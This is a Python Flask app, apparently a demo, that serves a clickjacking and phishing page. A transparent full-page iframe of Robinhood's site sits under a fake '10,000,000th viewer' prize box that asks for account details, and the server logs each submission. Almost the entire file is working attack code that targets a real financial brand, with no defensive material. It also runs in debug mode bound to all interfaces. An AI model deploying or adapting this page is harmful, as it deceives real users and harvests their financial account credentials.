from flask import Flask, request, render_template_string

app = Flask(__name__)

# HTML content for the clickjacking example
html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clickjacking Attack Example</title>
    <style>
        /* Make the iframe fully transparent and cover the entire page */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            z-index: 1;
        }
        /* The fake message box */
        .message-box {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: white;
            border: 2px solid black;
            padding: 20px;
            text-align: center;
            z-index: 2;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0);
        }

        /* Fake input field */
        input[type="text"] {
            padding: 10px;
            margin: 10px 0;
            width: 80%;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        /* Button styling */
        button {
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            background-color: #007bff;
            color: white;
            cursor: pointer;
        }

        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

    <!-- Transparent iframe with robinhoods's api site -->
    <iframe src="https://robinhood.com/us/en/applink/" frameborder="0"></iframe>

    <!-- Deceptive message box -->
    <div class="message-box">
        <h1>🎉 You are our 10,000,000th viewer!</h1>
        <p>Please enter your account details to claim your prize:</p>
        <form method="POST">
            <input type="text" name="account_details" placeholder="Account Details" required>
            <button type="submit">Submit</button>
        </form>
    </div>

</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # Capture and print the input from the form
        account_details = request.form.get('account_details')
        if account_details:
            print(f"Received input: {account_details}")
        return "Thank you for your submission!"

    # Render the HTML content
    return render_template_string(html_content)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)